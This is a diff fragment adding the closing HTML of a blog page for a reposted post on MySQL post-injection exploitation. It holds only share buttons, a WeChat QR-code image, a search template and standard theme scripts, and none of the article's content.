+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.twosee.cn/2018/01/06/mysql-injection/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《[转] Mysql注入后利用》 — TWO SEE&url=http://www.twosee.cn/2018/01/06/mysql-injection/&via=http://www.twosee.cn" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.twosee.cn/2018/01/06/mysql-injection/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJklEQVR42u3a0W7jMAwEwP7/T6evVxR2d8XkAEujpyBQZY0LMCKpr694vH6Nf7+/n/975v1qV2u+YWBgYDyW8boda4wEdv/0fG8YGBjnMK4efDXnE0GzDegYGBgYawe7+/n5+hgYGBhzRnuwm8zHwMDAyJPY9pg4eTUfzMUxMDAeyMjTy///+SP9DQwMjEcxXuXIS/z5N2s7+bEOBgbG1ow8wLXISTuh3Q8GBsbejLyw1ZbAJiE7uaJR9FoxMDAezsj/oD3M5bxJcvtH7RADA2NTxrx8P2kYJGtiYGBgTApqnyjMRVvHwMDYmpEf4yap5trBMXlNGBgYJzDaatVa8F1LgJOtX+4TAwNjO0aemq41D4qyfvy+/+jEYmBgbMQoLl0tXZ6YFNfq/wMGBsYxjDbsTmCTEhsGBsZpjLyRmaej89dRXLbAwMA4gNGGxTw1bTfXHjGLyI2BgbE1Yy0Q54fFtndx2YnFwMDYlNGWwNrHt2W19hoZBgbGOYz26lXbDHhvE/RyNQwMjAMY80T0XRfF3nBnBAMDY1PGpKzfFuAWy2q3K2BgYOzKeJUjL721QTYP38XZFgMDYwtGPtrCWXuIzJsQeUMCAwNjJ8ZakM1T38n8IuBiYGAcwJgX9NtD4dovQN0YwMDAOJix1shMSIvlPAwMDIw44CbJaptDRy1PDAyMAxhJEpsXy9oifn4pDQMD40zGJOQlCW276fe+IAwMjIczvgH5l/oI6dVjZQAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="/js/main.min.js?v=1.7.2"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="/js/search.min.js?v=1.7.2" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
